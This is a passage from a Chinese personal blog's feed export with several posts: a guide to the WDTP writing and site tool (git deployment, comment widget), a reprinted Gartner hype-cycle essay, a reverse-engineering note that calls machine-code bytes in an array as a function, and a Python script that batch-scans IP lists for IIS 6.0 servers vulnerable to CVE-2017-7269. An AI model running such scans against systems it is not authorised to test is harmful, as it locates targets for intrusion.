<li>创作。对职业作家（特别是技术作家以及需要大量构思与情节编排的文艺作家）来说比Pages、Word等WYSWYG类型的桌面文字软件更加高效、简洁和灵活的内容创作、章节管理与格式化排版工具。可方便地实现多章节（情节、场景、概念、故事主线等）并发创作/编辑、任意调序、随意归类等强大功能，完稿后一键即可成书。</li>
<li>笔记。可随时记录并管理学习笔记、读书笔记以及有一定篇幅并打算结构化保存、管理、检视和封装的零星随记、杂感等等。可定期将所有或任意分类（目录）下的笔记“装订成册”、集中输出，一键即可完成。</li>
<li>建站。强大而新颖的静态网站维护、编辑、生成、代码调试与内容、结构管理系统。特别适合追求全站真正静态化、内容至上的个人博客与中小企业官网。</li>
<li>Markdown编辑器。在保留并规范了大部分“正统”Markdown语法的基础上，WDTP根据大多数作者/作家的实际需求，增加了一批非常实用的新文本标记语法。比如：插入图注和表注、居中、靠右、多种类型的表格、图文混排、插入音视频媒体文件、内容注释、跨文档扩展标记等等。该编辑器针对Windows系统和macOS系统（非Retina显示屏）对中文字体的渲染结果不尽人意等情况专门做了特殊优化与调整，使用户在输入、编辑时可获得更良好的体验。</li>
<li>以上几项，不仅可以文字输入，更可以语音输入，直接记录声音。这一点对不擅长文字表达的朋友或者记者、演员、各类主持人、音乐家、演奏家等群体来说非常方便。</li>
<li>WDTP还有极具实用价值的“复习/提醒”功能，文档隐身功能，文档缩略语功能和极其强悍的“智库”架构。<br>其他更多……</li>
</ul>
<p>在“笔记、写书、建站/博客、前端开发”这几个方面，WDTP（山湖录）无缝集成，一键切换。即：同一套内容，随时可生成上述任何一种类型，还可多种类型混合使用。</p>
<p><strong>程序采用c++语言编写，作者同时也是我十分敬重的一位程序员，如果想查看更多信息请访问他的<a href="http://underwaysoft.com/works/wdtp/index.html" target="_blank" rel="external">项目主页</a>程序开源<a href="https://github.com/LegendRhine/WDTP" target="_blank" rel="external">github地址</a></strong></p>
<h2 id="上手使用"><a href="#上手使用" class="headerlink" title="上手使用"></a>上手使用</h2><p>本来想说更多的，但是确实这款软件和其他的静态博客生成器不一样，拥有着方便的界面，支持english和中文，设置里面即可切换，相信只要你使用过，你就会使用它，能感受到他的方便快捷，如果想看更多玩法和说明请查看<a href="http://underwaysoft.com/works/wdtp/index.html" target="_blank" rel="external">项目主页</a>，现在只支持两种模板book(用来作为笔记)和blog(用来生成静态博客)，不过作者说会逐渐增加主题，真的除了暂时主题匮乏之外(会前端的可以自己改改主题)，其他的功能相比于其他的静态博客生成器方便得不是一丁半点</p>
<p><strong>那么生成静态文件之后如何上传到自己的vps或者github pages或者coding pages呢？</strong></p>
<h3 id="上传到vps"><a href="#上传到vps" class="headerlink" title="上传到vps"></a>上传到vps</h3><p>这个你可以使用常规的FTP或者Rsync或者其他方法上传，不过我推荐自己的做法(使用Resilio Sync)<br>如果你的服务器是windows那么你只需要去<a href="https://www.resilio.com/individuals/" target="_blank" rel="external">Resilio Sync官网</a>下载，建议安装为服务，然后访问本机sync服务的网址，点击右上角添加文件夹添加你的网站根目录，然后复制读写key，本机安装Resilio sync客户端然后手动连接这个key到你的静态文件目录，具体可以查资料，这个不难<br>如果你的服务器是Linux，可以查看Resilio Sync网站上面的<a href="https://help.getsync.com/hc/en-us/articles/206178924" target="_blank" rel="external">How to install Sync Package on Linux</a>，说明比较详细，安装好之后和上面的步骤一样，然后只要你本机挂着resilio sync软件，生成就可以即时同步。<br>trust me， 你将找到这个软件(Resilio Sync)更多的玩法，这软件之前的名字是btsync<br>当然，这只是我自己使用的方法，你也可以使用其他方法<br>至于上传到github pages或者coding pages，这个你需要会用git，进入静态文件目录，然后bash下执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">git init</div><div class="line">git add .</div><div class="line">git commit //命令给文件一个仓库标记，做为仓库历史，便于以后在远程端查找</div><div class="line">git remote add origin git@github.com:username/username.github.io.git</div></pre></td></tr></table></figure></p>
<p>git@github.com:username/username.github.io.git的是你的git远端地址，至于为什么用这个是因为ssh创建公钥之后不用重复输入密码<br><strong>注: </strong><a href="https://coding.net/help/doc/account/ssh-key.html" target="_blank" rel="external">如何生成ssh公钥</a>这篇文章是以coding.net为例，不过你生成的id_rsa.pub内容同时也可以添加到github，基本相同的步骤，如果有什么疑问可以百度一下关键词为<code>github ssh公钥 配置</code></p>
<h3 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h3><ul>
<li>如果你不愿意麻烦可以使用邮箱来收集评论<br>打开qq邮箱点击上方<strong>设置-&gt;账户-&gt;邮我-&gt;使用邮我</strong><br>然后获取代码<br><img src="https://ooo.0o0.ooo/2017/04/01/58df97595ea80.png" alt="snipaste_20170401_200420.png"><br>复制<code>&lt;a target=&quot;_blank&quot; href=&quot;http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg&quot; style=&quot;text-decoration:none;&quot;&gt;</code><br>然后打开你的项目文件夹/themes/blog/article.html，把相应的地方改为下面例子这样<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">page_navi</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">"http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&amp;email=64qAgJ6GioWYq5qaxYiEhg"</span> <span class="attr">style</span>=<span class="string">"text-decoration:none;"</span>&gt;</span>评论/咨询/讨论/留言<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
</ul>
<p>然后别人点击评论就可以打开给你发邮件的入口</p>
<ul>
<li>如果你想添加社会化评论系统<br>鉴于多说即将关闭，国内没被墙的无需北岸的第三方评论已经很少了，这里我用<a href="https://livere.com" target="_blank" rel="external">来必力</a>做例子</li>
</ul>
<ol>
<li>注册登录(如果chrome浏览器注册之后一直登录不了请使用火狐)</li>
<li>点击顶栏安装，然后填好相关信息获取代码<br><img src="https://ooo.0o0.ooo/2017/04/01/58df9a0fc3eb5.png" alt="snipaste_20170401_201601.png"></li>
<li><p>然后打开你的项目文件夹/themes/blog/article.html，把原先的评论代码删除掉，在合适的地方插入上方代码，我插入完之后的article.html例子如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!doctype html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Generator"</span> <span class="attr">content</span>=<span class="string">"WDTP by UnderwaySoft"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Author"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;author&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Keywords"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;keywords&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"Description"</span> <span class="attr">content</span>=<span class="string">"&#123;&#123;description&#125;&#125;"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123;siteRelativeRootPath&#125;&#125;add-in/style.css"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;&#123;title&#125;&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> </div><div class="line">  &#123;&#123;siteLogo&#125;&#125;</div><div class="line">  &#123;&#123;siteMenu&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;siteNavi&#125;&#125;</div><div class="line">  &#123;&#123;content&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;createAndModifyTime&#125;&#125;</div><div class="line"></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span><span class="tag">&lt;<span class="name">h5</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"background:PowderBlue"</span>&gt;</span></div><div class="line">	    本文版权：&#123;&#123;siteLink&#125;&#125; &amp;emsp;</div><div class="line">		共享协议：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://creativecommons.org/licenses/by-nc-nd/2.5/deed.zh'</span> <span class="attr">target</span>=<span class="string">'_blank'</span>&gt;</span>署名-非商业使用-禁止演绎<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h5</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">  &#123;&#123;previousAndNext&#125;&#125;</div><div class="line"></div><div class="line">  &#123;&#123;ad&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></div><div class="line">  &#123;&#123;random&#125;&#125;</div><div class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!-- 来必力City版安装代码 --&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lv-container"</span> <span class="attr">data-id</span>=<span class="string">"city"</span> <span class="attr">data-uid</span>=<span class="string">"MTAyMC8yODAwMC80NTc3"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></div><div class="line">			(function(d, s) &#123;</div><div class="line">				var j, e = d.getElementsByTagName(s)[0];</div><div class="line"></div><div class="line">				if (typeof LivereTower === 'function') &#123; return; &#125;</div><div class="line"></div><div class="line">				j = d.createElement(s);</div><div class="line">				j.src = 'https://cdn-city.livere.com/js/embed.dist.js';</div><div class="line">				j.async = true;</div><div class="line"></div><div class="line">				e.parentNode.insertBefore(j, e);</div><div class="line">			&#125;)(document, 'script');</div><div class="line">		<span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">noscript</span>&gt;</span> 为正常使用来必力评论功能请激活JavaScript<span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">	<span class="comment">&lt;!-- City版安装代码已完成 --&gt;</span></div><div class="line">  &#123;&#123;contact&#125;&#125;</div><div class="line">  &#123;&#123;bottomCopyright&#125;&#125;</div><div class="line"></div><div class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
</li>
<li><p>最后的效果如图<br><img src="https://ooo.0o0.ooo/2017/04/01/58df9adb69d5f.png" alt="snipaste_20170401_201926.png"></p>
</li>
</ol>
<h3 id="最后要说的"><a href="#最后要说的" class="headerlink" title="最后要说的"></a>最后要说的</h3><p>这个工具确实是十分方便的，如果你作为笔记，可以使用坚果云来同步，同时它可以打包你的数据，多说无益，试用之后你会感受到它的强大</p>
<p><strong>本文部分转自<a href="http://underwaysoft.com/works/wdtp/download.html" target="_blank" rel="external">Underwaysoft</a></strong></p>
]]></content>
      
        <categories>
            
            <category> 推荐向 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 推荐向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iis6-0 cve-2017-7269 批量验证脚本]]></title>
      <url>http://akkuman.coding.me/2017/04/01/iis6-0-cve-2017-7269.html</url>
      <content type="html"><![CDATA[<p><a href="https://gist.githubusercontent.com/iam1980/62ee37e38c7f76ca5d3889379e1d81fd/raw/aed9a3ef42bc6e6592913c5df8906ca6c57c9c66/getpro.py" target="_blank" rel="external">代码地址</a></p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"></div><div class="line">f = open(<span class="string">'ips.txt'</span>, <span class="string">'r'</span>)</div><div class="line">flines = f.readlines()</div><div class="line"></div><div class="line">vulnsrvs = <span class="number">0</span></div><div class="line">i = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> flines:</div><div class="line"></div><div class="line">    host = line.split(<span class="string">":"</span>)</div><div class="line"></div><div class="line">    ip = host[<span class="number">0</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">    port = host[<span class="number">1</span>].replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Try ("</span> + str(i) +<span class="string">") "</span>+ str(ip) +<span class="string">":"</span> + str(port)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> port == <span class="string">"443"</span>:</div><div class="line">        <span class="comment">#dont bother with SSL/TLS</span></div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        myout =  subprocess.check_output([<span class="string">'curl'</span>, <span class="string">'--connect-timeout'</span>, <span class="string">'2'</span>, <span class="string">'--max-time'</span>, <span class="string">'2'</span>, <span class="string">'-s'</span>,<span class="string">'-I'</span>, <span class="string">'-X'</span>, <span class="string">'PROPFIND'</span>,<span class="string">'http://'</span> + ip  + <span class="string">':'</span> + port + <span class="string">'/'</span> ])</div><div class="line">        <span class="keyword">print</span> myout</div><div class="line">        <span class="keyword">if</span> <span class="string">"HTTP/1.1 411 Length Required"</span> <span class="keyword">in</span> myout:</div><div class="line">            <span class="keyword">print</span> <span class="string">"Found one:"</span></div><div class="line">            <span class="keyword">print</span> myout</div><div class="line">            vulnsrvs += <span class="number">1</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">print</span> str(e.output)</div><div class="line">    i += <span class="number">1</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"Vulnerable: "</span> + str(vulnsrvs)</div></pre></td></tr></table></figure>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>ips.txt 是待验证的列表格式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">129.112.44.1:80</div><div class="line">129.112.44.2:81</div><div class="line">129.112.44.43:8808</div></pre></td></tr></table></figure></p>
<p>它不检测443端口（HTTPS）<br>你也可以简单改一下进行网段批量验证。</p>
<p>转自群友<a href="http://www.loner.fm/article.php?id=24251" target="_blank" rel="external">CF_HB</a></p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hacker </tag>
            
            <tag> Tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[推荐一个十分好看的开源博客系统]]></title>
      <url>http://akkuman.coding.me/2017/03/12/a-beautiful-open-source-blog-lcm.html</url>
      <content type="html"><![CDATA[<p>推荐一个十分好看的开源博客系统，直接百度“里程密”地址<a href="http://www.lcm.wang/" target="_blank" rel="external">www.lcm.wang</a></p>
<p>附图</p>
<p>主页</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c53df6b41cf.png" alt="snipaste_20170312_202041.png"></p>
<p>后台</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c53e0b65eaa.png" alt="snipaste_20170312_201924.png"></p>
<p>浓浓的科技简约风，适合做技术的你</p>
]]></content>
      
        <categories>
            
            <category> life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[技术的热门度曲线]]></title>
      <url>http://akkuman.coding.me/2017/03/12/technology-s-popularity-curve.html</url>
      <content type="html"><![CDATA[<p>全球最大的 IT 咨询公司<a href="http://baike.baidu.com/item/Gartner" target="_blank" rel="external">高德纳</a>（Gartner），有一个”<a href="http://www.gartner.com/technology/research/methodologies/hype-cycle.jsp" target="_blank" rel="external">技术热门度曲线</a>“模型（Gartner Hype Cycle）。</p>
<p>该模型认为，一门技术的发展要经历五个阶段。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4de8267e76.png" alt="bg2017030301.png"><br><a id="more"></a></p>
<ol>
<li><p><strong>启动期（Innovation Trigger）</strong><br>该技术刚刚诞生，还只是一个概念，不具有可用性，无法评估商业潜力。媒体有所报道，引起了外界的兴趣。</p>
</li>
<li><p><strong>泡沫期（Peak of Inflated Expectations）</strong><br>该技术逐步成型，出现了个别成功的案例，一些激进的公司开始跟进。媒体开始大肆报导，伴有各种非理性的渲染，产品的知名度达到高峰。</p>
</li>
<li><p><strong>低谷期（Trough of Disillusionment）</strong><br>该技术的局限和缺点逐步暴露，对它的兴趣开始减弱。基于它的产品，大部分被市场淘汰或者失败，只有那些找到早期用户的公司艰难地活了下来。媒体对它的报道逐步冷却，前景不明。</p>
</li>
<li><p><strong>爬升期（Slope of Enlightenment）</strong><br>该技术的优缺点越来越明显，细节逐渐清晰，越来越多的人开始理解它。基于它的第二代和第三代产品出现，更多的企业开始尝试，可复制的成功使用模式出现。媒体重新认识它，业界这一次给予了高度的理性的关注。</p>
</li>
<li><p><strong>高原期（Plateau of Productivity）</strong><br>经过不断发展，该技术慢慢成为了主流。技术标准得到了清晰定义，使用起来越发方便好用，市场占有率越来越高，进入稳定应用阶段。配合它的工具和最佳实践，经过数代的演进，也变得非常成熟了。业界对它有了公认的一致的评价。</p>
</li>
</ol>
<p>该模型的细节可以查看维基百科的<a href="https://en.wikipedia.org/wiki/Hype_cycle#/media/File:Hype-Cycle-General.png" target="_blank" rel="external">大图</a>。</p>
<p>高德纳公司每年都会公布，当年的热门技术图。下面就是去年七月的图。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df3436d4e.png" alt="bg2017030302.png"></p>
<p>上图中，4D打印处于”启动期”，区块链处于”泡沫期”，增强现实处于”低谷期”，虚拟现实处于爬升期。</p>
<p>本周，有人进行数据分析后，建立了一个名叫 <a href="https://stateofdev.com/" target="_blank" rel="external">State.of.Dev</a> 的网站，提供各种技术的热门程度图。</p>
<p>下图是编程语言。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df61bd060.png" alt="bg2017030303.png"></p>
<p>上图中，Rust 语言处于启动期，Go 语言处于泡沫期，Ruby 语言处于低谷期，Object-C 处于爬升期，PHP 和 Java 处于高原期。</p>
<p>下图是 Web 技术。</p>
<p><img src="https://ooo.0o0.ooo/2017/03/12/58c4df7a78ea1.png" alt="bg2017030305.png"></p>
<p>上图中，WebAssembly 处于启动期，WebRTC 处于低谷期，HTTPS 处于高原期。</p>
<p>一门技术到底前景如何，很难预测，但是它的热门程度却是可以衡量的（比如在社交媒体提及次数的增长幅度）。风险投资跟热门程度高度正相关，越热门的技术越容易拿到投资。</p>
<p>用户可以采用这张图，判断技术处在哪一个阶段，确定它的热门程度。简单的使用规则如下。</p>
<blockquote>
<p><strong>“争取风险投资，要选择热门的技术；解决实际问题， 要选择可靠的技术。”</strong></p>
</blockquote>
<p>简单说，处于启动期的技术，风险很大，不确定性极高，但是一旦成功，回报可能也很高，适合创业公司；处于高原期的技术，非常可靠，风险低，有成熟的解决方案和配套工具，适合大公司和企业的内部应用。</p>
<p>反过来说，如果一门技术处于高原期了，就代表它非常成熟了，人们对它能干什么和不能干什么，都已经很了解了，也没有新的期待了，技术本身的潜力已经不大了，所以用它拿不到投资，只能用来干活。</p>
<p>（完）</p>
<p><strong>转载自<a href="http://www.ruanyifeng.com/blog/2017/03/gartner-hype-cycle.html" target="_blank" rel="external">阮一峰的网络日志</a></strong></p>
]]></content>
      
        <categories>
            
            <category> life </category>
            
        </categories>
        
        
        <tags>
            
            <tag> life </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[逆向学习笔记（2）-这是代码还是数据]]></title>
      <url>http://akkuman.coding.me/2017/03/10/reverse-engineering-study-note-2-is-this-code-or-data.html</url>
      <content type="html"><![CDATA[<p><strong>以下的ide为CodeBlocks，编译器采用的GCC，系统为win10 64bit,在不同编译器和环境下汇编代码可能不同</strong><br><a id="more"></a></p>
<h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmin</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(a&gt;b)</div><div class="line">		<span class="keyword">return</span> b;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		<span class="keyword">return</span> a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</div><div class="line">    pfunction pGetmin = (pfunction)getmin;</div><div class="line">	</div><div class="line">    c = pGetmin(a, b);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>上面这段代码是比大小输出小的，<code>typedef int (*pfunction)(int, int);</code>定义了一个函数指针，但是下面这段代码和上面的功能是完全一样的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*pfunction)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a=<span class="number">456789</span>,b=<span class="number">123789</span>,c=<span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> loc[] =</div><div class="line">    &#123;</div><div class="line">        <span class="number">0x55</span>, <span class="number">0x89</span>, <span class="number">0xE5</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x3B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0x7E</span>, <span class="number">0x05</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x0C</span>, <span class="number">0xEB</span>, <span class="number">0x03</span>, <span class="number">0x8B</span>, <span class="number">0x45</span>, <span class="number">0x08</span>, <span class="number">0x5D</span>, <span class="number">0xC3</span></div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    pfunction getmin = (pfunction)&amp;loc;</div><div class="line">    c = getmin(a, b);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,c);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>当<code>c = pGetmin(a, b);</code>调用pGetmin的时候，在汇编中是先call跳到一个地址然后从那个地址再jmp到函数入口地址然后开始执行函数<br>getmin函数整体汇编为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">push   ebp</div><div class="line">mov    ebp,esp</div><div class="line">mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">cmp    eax,DWORD PTR [ebp+0xc]</div><div class="line">jle    &lt;getmin+16&gt;</div><div class="line">mov    eax,DWORD PTR [ebp+0xc]</div><div class="line">jmp    &lt;getmin+19&gt;</div><div class="line">mov    eax,DWORD PTR [ebp+0x8]</div><div class="line">pop    ebp</div><div class="line">ret</div></pre></td></tr></table></figure></p>
<p>通过一些调试程序（发现CodeBlocks带的汇编调试没有vc6好用，看不到硬编码）可以得出这段汇编代码在硬编码中的值为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x55, 0x89, 0xE5, 0x8B, 0x45, 0x08, 0x3B, 0x45, 0x0C, 0x7E, 0x05, 0x8B, 0x45, 0x0C, 0xEB, 0x03, 0x8B, 0x45, 0x08, 0x5D, 0xC3</div></pre></td></tr></table></figure></p>
<p>这段数据我们在第二个代码中把它存入了一个char类型的数组，它虽然在数据区，但是它还是可以看作可运行的一段函数代码，我们依旧定义一个函数指针指向这个char类型数组的入口地址，达到了和第一种相同的效果<br>在编程中，我们是把代码和数据分得很开的，但是在逆向和汇编中，这个区别就不明显了，在计算机中都是以数据形式存在的，你可以说它是一串数据，也可以说它是代码</p>
<p><strong><em>转载请注明出处</em></strong></p>
]]></content>
      
        <categories>
            
            <category> 逆向 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[逆向学习笔记（1）-为什么代码不停地循环运行]]></title>
      <url>http://akkuman.coding.me/2017/03/09/reverse-engineering-study-note-1-why-does-code-keep-running.html</url>
      <content type="html"><![CDATA[<p>对于下面这段c语言代码会一直不停地循环，为什么呢？</p>
